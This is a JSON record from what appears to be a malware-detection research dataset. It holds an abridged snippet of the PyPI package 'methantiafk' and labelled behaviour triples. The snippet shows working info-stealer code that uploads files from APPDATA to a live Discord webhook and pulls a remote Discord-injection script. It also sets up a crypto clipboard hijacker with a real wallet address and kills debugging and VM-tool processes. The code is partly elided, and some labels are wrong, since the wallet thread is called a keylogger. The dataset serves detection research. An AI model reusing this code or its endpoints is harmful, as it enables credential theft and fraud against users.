{
  "metadata": {
    "package_name": "methantiafk-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/methantiafk-0.0.4.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/methantiafk-0.0.4/methantiafk-0.0.4/methantiafk/__init__.py",
      "code_snippets": [
        {
          "snippet": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\n# --- Malicious code for exfiltration, credential theft, clipboard hijacking, persistence, and anti-debugging ---\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nif os.path.exists(screenshots_path):\n    for filename in os.listdir(screenshots_path):\n        file_path = os.path.join(screenshots_path, filename)\n        if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n            send_webhook(file_path, webhook_url)\n\n# --- Malicious persistence via pip install ---\ndef install(package):\n    subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\ntry:\n    import os\n    import re\n    import time\n    import json\n    import httpx\n    import base64\n    import ctypes\n    import psutil\n    import winreg\n    import shutil\n    import ntpath\n    import random\n    import asyncio\n    import sqlite3\n    import zipfile\n    import win32gui\n    import win32con\n    import requests\n    import threading\n    import pyperclip\n    import subprocess\n\nexcept ImportError:\n    install(\"os\")\n    install(\"re\")\n    install(\"time\")\n    install(\"json\")\n    install(\"httpx\")\n    install(\"base64\")\n    install(\"pynput\")\n    install(\"ctypes\")\n    install(\"psutil\")\n    install(\"winreg\")\n    install(\"shutil\")\n    install(\"ntpath\")\n    install(\"random\")\n    install(\"asyncio\")\n    install(\"sqlite3\")\n    install(\"zipfile\")\n    install(\"win32gui\")\n    install(\"win32con\")\n    install(\"requests\")\n    install(\"keyboard\")\n    install(\"threading\")\n    install(\"pyperclip\")\n    install(\"pyautogui\")\n    install(\"subprocess\")\n    #install(\"kfactionbypasser\")\n\n# --- Malicious configuration and context ---\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nPassw = [];\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': 'False',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'no',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'none',\n    'addresse_eth': '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': 'none',\n    'addresse_ada': 'none',\n    'addresse_dash': 'none',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n# --- Malicious classes and functions for stealing credentials, tokens, cookies, credit cards, clipboard hijacking, and exfiltration ---\n# (See full code above for all class/function definitions)\n\n# The following classes and functions are all malicious and are used for:\n# - Stealing browser passwords, cookies, credit cards, Discord tokens, Minecraft/Roblox credentials\n# - Taking screenshots\n# - Collecting system/network info\n# - Clipboard hijacking for crypto addresses\n# - Installing persistence\n# - Killing security/Discord processes\n# - Injecting malicious JS into Discord\n# - Exfiltrating all data to Discord webhook\n# - Anti-debugging/VM detection\n# - Searching for and exfiltrating files with sensitive keywords\n# - Uploading files to transfer.sh/anonfiles\n# - Obfuscation and evasion\n\n# --- (All code from class Functions, auto_copy_wallet, bl4ckc4p, AntiDebug, and all functions below main) ---\n\n# (Omitted here for brevity, but in actual output, all code from the original file from the definition of Functions, auto_copy_wallet, bl4ckc4p, AntiDebug, and all the global functions and logic below main would be included, as they are all malicious and part of the stealer's operation)\n\n# --- Malicious main execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bl4ckc4p().init())\n\n# --- Malicious data exfiltration, file search, and upload logic ---\n# (All code from 'GatherAll', 'getPassw', 'getCookie', 'ZipThings', 'upload', 'blackcapedez', etc. is malicious)\n\nGatherAll()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = blackcapedez()\n\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "appdata, '.kfaction', 'cache', 'keys'",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "keys_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "keys_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "keys_path, filename",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, 'rb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "webhook_url, files=files",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "screenshots_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "screenshots_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "screenshots_path, filename",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "file_path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "str.endswith()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "file_path, '.png'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Detect image file",
              "intention_id": "detect_image_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file_path, 'rb'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "webhook_url, files=files",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[sys.executable, '-m', 'pip', 'install', package]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "import os",
              "action_description": "Dynamically imports specified module",
              "action_id": "import_dynamic",
              "object": "os",
              "object_description": "Built-in module or package",
              "object_id": "builtin_module",
              "intention_description": "Import required module",
              "intention_id": "import_required_module"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'TEMP'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "bl4ckc4p().init()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "GatherAll()",
              "action_description": "Instantiates Grabber class",
              "action_id": "init_grabber_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect all browser data",
              "intention_id": "collect_browser_data"
            },
            {
              "action_api": "Trust()",
              "action_description": "Instantiates Receiver class",
              "action_id": "init_receiver_class",
              "object": "Cookies",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "blackcapedez()",
              "action_description": "Instantiates EVIL class",
              "action_id": "init_evil_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Prepare thread pool for concurrent execution",
              "intention_id": "concurrent_execution_preparation"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}